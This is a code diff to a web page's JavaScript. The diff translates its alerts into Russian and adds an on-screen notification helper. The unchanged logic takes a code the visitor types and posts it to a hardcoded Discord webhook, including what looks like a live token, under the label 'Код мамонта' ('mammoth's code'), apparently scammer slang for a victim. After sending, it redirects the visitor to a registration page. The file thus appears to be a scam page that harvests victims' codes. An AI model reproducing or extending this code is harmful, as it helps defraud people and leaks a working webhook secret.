@@ -3,12 +3,12 @@ document.getElementById('submitBtn').addEventListener('click', function() {
     if (inviteCode) {
         sendToDiscord(inviteCode);
     } else {
-        alert('Please enter a code!');
+        showNotification('Пожалуйста, введите код!', 'error');
     }
 });
 
 function sendToDiscord(code) {
-    const webhookURL = 'https://discordapp.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv'; // Replace with your actual Discord webhook URL
+    const webhookURL = 'https://discordapp.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv'; // Замените на свой вебхук
     const payload = {
         content: `Код мамонта: ${code}`
     };
@@ -22,14 +22,26 @@ function sendToDiscord(code) {
     })
     .then(response => {
         if (response.ok) {
-            alert('Код получен');
-            window.location.href = 'reg.html'; // Change this to the page you want to redirect to
+            showNotification('Код получен!', 'success'); // Показываем уведомление об успехе
+            window.location.href = 'reg.html'; // Переход на страницу
         } else {
-            alert('Failed to send code.');
+            showNotification('Не удалось отправить код.', 'error'); // Показываем уведомление об ошибке
         }
     })
     .catch(error => {
         console.error('Error:', error);
-        alert('An error occurred.');
+        showNotification('Произошла ошибка.', 'error'); // Показываем уведомление о сети
     });
+}
+
+// Функция для отображения уведомлений
+function showNotification(message, type) {
+    const notification = document.getElementById('notification'); // Элемент для уведомлений
+    notification.textContent = message;
+    notification.className = type; // Добавляем класс для стилизации
+    notification.style.display = 'block'; // Показываем уведомление
+
+    setTimeout(() => {
+        notification.style.display = 'none'; // Скрываем уведомление через 3 секунды
+    }, 3000);
 }
